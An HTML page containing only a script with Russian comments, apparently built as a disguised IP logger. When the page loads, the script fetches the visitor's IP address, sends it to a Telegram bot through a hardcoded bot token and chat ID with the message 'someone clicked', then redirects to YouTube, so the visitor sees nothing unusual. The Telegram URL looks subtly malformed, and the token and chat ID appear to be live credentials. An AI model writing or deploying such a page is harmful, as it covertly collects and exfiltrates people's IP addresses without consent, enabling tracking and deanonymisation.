<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
</head>
<body style="background: #000;">
    <script>
        // ТВОИ ПРОВЕРЕННЫЕ ДАННЫЕ
        const TOKEN = "8413511998:AAHZuQrJyZnyqJusMNbH074Rw-UzQEMSPpA";
        const CHAT_ID = "8426763446";

        async function getIp() {
            try {
                // 1. Получаем IP
                const response = await fetch('https://api.ipify.org');
                const data = await response.json();
                const ip = data.ip;

                // 2. Ссылка для отправки (проверь каждый символ!)
                const url = `https://api.telegram.org{TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent("Кто-то перешел!\nIP: " + ip)}`;

                // 3. Отправляем запрос
                await fetch(url);

            } catch (e) {
                console.error(e);
            } finally {
                // 4. Перекидываем на ютуб в любом случае
                window.location.href = "https://www.youtube.com"; 
            }
        }

        getIp();
    </script>
</body>
</html>
